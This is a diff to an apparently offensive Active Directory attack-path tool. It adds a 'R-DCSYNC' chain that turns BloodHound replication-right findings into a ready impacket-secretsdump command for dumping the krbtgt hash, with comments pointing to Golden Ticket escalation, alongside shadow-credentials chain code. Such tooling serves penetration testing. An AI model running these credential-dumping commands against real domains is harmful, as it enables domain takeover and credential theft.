@@ -685,6 +685,30 @@ def run(report, store, ui=None):
             if key in seen:
                 continue
             seen.add(key)
+            # iter-37: DCSync rights - direct DCSync without needing to
+            # gain admin first. Highest-value ACL-edge chain because it
+            # yields krbtgt (which then enables R-GOLDEN at score 15).
+            # Dedup: only emit ONE chain per target even if both
+            # GetChanges + GetChangesAll edges are present (both are
+            # needed for DCSync; the finding is per-target, not per-right).
+            if r in ("GetChanges", "GetChangesAll",
+                     "GetChangesInFilteredSet"):
+                dcsync_key = ("dcsync", tgt)
+                if dcsync_key in seen:
+                    continue
+                seen.add(dcsync_key)
+                _dom_ds = store.dominant_domain() or "<DOM>"
+                chains.append(Chain("R-DCSYNC", "direct DCSync via ACL",
+                    f"DCSync rights on {tgt} (principal has GetChanges + "
+                    f"GetChangesAll)",
+                    crit=10, conf=0.9, ready=1.5, prox=1.0,        # score 13.5
+                    commands=[
+                        f"# principal SID: {edge.get('principal', '<see BloodHound>')}",
+                        f"impacket-secretsdump -just-dc-user krbtgt "
+                        f"'{_dom_ds}/<owned-user>:<password>'@<DC-IP>",
+                        f"# with krbtgt hash, next: R-GOLDEN chain",
+                    ], src=edge["src"], line=edge["line"]))
+                continue
             if r == "AddKeyCredentialLink":
                 chains.append(Chain("R-SHADOW", "shadow credentials",
                     f"AddKeyCredentialLink on {tgt} (Shadow Creds -> PKINIT -> NT hash)",
